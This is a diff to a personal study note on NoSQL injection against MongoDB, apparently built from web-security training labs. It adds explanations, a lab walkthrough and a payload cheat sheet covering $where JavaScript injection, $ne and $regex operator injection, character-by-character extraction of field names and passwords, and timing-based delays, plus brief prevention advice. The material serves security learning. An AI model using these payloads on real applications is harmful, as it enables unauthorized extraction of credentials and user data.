@@ -132,8 +132,84 @@ You could also use the JavaScript `match()` function to extract information. F
 `admin' && this.password.match(/\d/) || 'a'=='b`
 
 
+#### Identifying field names
+
+Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.
+
+For example, to identify whether the MongoDB database contains a `password` field, you could submit the following payload:
+
+`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
+
+Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the `username` field exists, so you could send the following payloads:
+
+`admin' && this.username!='` `admin' && this.foo!='`
+
+If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).
+
+If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names.
 
 
+### Injecting operators in MongoDB
+
+Consider a vulnerable application that accepts username and password in the body of a `POST` request:
+
+`{"username":"wiener","password":"peter"}`
+
+To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:
+
+`{"username":"wiener","password":"peter", "$where":"0"}``{"username":"wiener","password":"peter", "$where":"1"}`
+
+If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.
+
+#### Extracting field names
+
+If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:
+
+`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
+
+This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.
+
+
+
+#### Exfiltrating data using operators
+
+Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the `$regex` operator to extract data character by character.
+
+Consider a vulnerable application that accepts a username and password in the body of a `POST` request. For example:
+
+`{"username":"myuser","password":"mypass"}`
+
+You could start by testing whether the `$regex` operator is processed as follows:
+
+`{"username":"admin","password":{"$regex":"^.*"}}`
+
+If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:
+
+`{"username":"admin","password":{"$regex":"^a*"}}`
+
+Timing based injection
+----------------------
+
+Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.
+
+To conduct timing-based NoSQL injection:
+
+1.  Load the page several times to determine a baseline loading time.
+2.  Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of 5000 ms on successful injection.
+3.  Identify whether the response loads more slowly. This indicates a successful injection.
+
+The following timing based payloads will trigger a time delay if the password beings with the letter `a`:
+
+`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'``admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
+
+Preventing NoSQL injection
+--------------------------
+
+The appropriate way to prevent NoSQL injection attacks depends on the specific NoSQL technology in use. As such, we recommend reading the security documentation for your NoSQL database of choice. That said, the following broad guidelines will also help:
+
+-   Sanitize and validate user input, using an allowlist of accepted characters.
+-   Insert user input using parameterized queries instead of concatenating user input directly into the query.
+-   To prevent operator injection, apply an allowlist of accepted keys.
 
 
 
@@ -363,6 +439,153 @@ ugemsykg
 
 
 
+<details>
+  <summary>Lab: Exploiting NoSQL operator injection to extract unknown fields</summary>
+
+
+```
+{"username":"carlos","password":{"$ne":"invalid"}}
+```
+
+<img width="1403" height="633" alt="image" src="https://github.com/user-attachments/assets/3f1cd985-1d45-4f22-9567-39456c7f82c4" />
+
+Result:\
+⚠️ Account locked
+
+This means:
+
+- `$ne` Vulnerable → Vulnerable
+
+- The query fetches more than one user → and a different error appears
+
+✔️ That's how we discovered injection.
+
+
+---
+
+### 2) Test running JavaScript inside `$where`
+
+
+```
+{"username":"carlos","password":{"$ne":"invalid"}, "$where":"1"}
+
+```
+
+> ⚠️ Account locked
+
+This means:\
+**JavaScript injection is on**
+
+---
+
+
+### **3) We start extracting the field names in Carlos’s Object (Document)**
+
+```
+{
+  "username":"carlos",
+  "password":{"$ne":"invalid"},
+  "$where": "function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }"
+}
+```
+
+
+<img width="1402" height="630" alt="image" src="https://github.com/user-attachments/assets/41c2392e-fcc8-4802-9e07-1734020306e0" />
+
+> that is mean first feild is **`_id`** and we can find the other
+
+
+<img width="1409" height="627" alt="image" src="https://github.com/user-attachments/assets/cbf9e3e9-60b7-4999-afe5-3d1c1ca45d17" />
+
+<img width="1454" height="635" alt="image" src="https://github.com/user-attachments/assets/284d6739-462e-4dcf-841c-62d2debe90d6" />
+
+
+> ## we have just one hidden feild after **`_id`** , **`username`** , **`password`**
+
+## find the lenght of the feild
+
+```
+"$where": "function(){ if(Object.keys(this)[0].length == 1) return 1; else 0; }"
+```
+
+
+
+
+## find the name
+
+```
+"$where": "function(){ if(Object.keys(this)[3].match(/^a/)) return 1; else 0; }"
+```
+
+```
+"$where": "Object.keys(this)[4].match(/^.{1}a.*/)"
+                                          | |
+```
+
+```
+{
+
+    "username": "carlos",
+
+    "password": {
+
+        "$ne": "invalid"
+
+    },
+
+    "$where": "Object.keys(this)[4].match(/^.{1}a.*/)"
+
+}
+```
+
+
+
+
+
+
+
+  
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -410,6 +633,54 @@ administrator' && /^a.*/.test(this.password) || 'a'=='b
 administrator' && /^ab.*/.test(this.password) || 'a'=='b
 
 ```
+
+**`identify feilds`**
+
+```
+administrator' && this.password!='
+```
+
+---
+---
+
+
+
+```json
+{"username":"wiener","password":"peter","$where":"0"}
+{"username":"wiener","password":"peter","$where":"1"}
+```
+
+
+```
+{"username":"admin","password":{"$regex":"^.*"}}
+```
+
+
+#### Extracting field names
+
+```json
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+
+
+#### Timing-based NoSQL Injection
+
+```
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
+
+
+
+
+
+
+
+
+
+
+
 
 
 
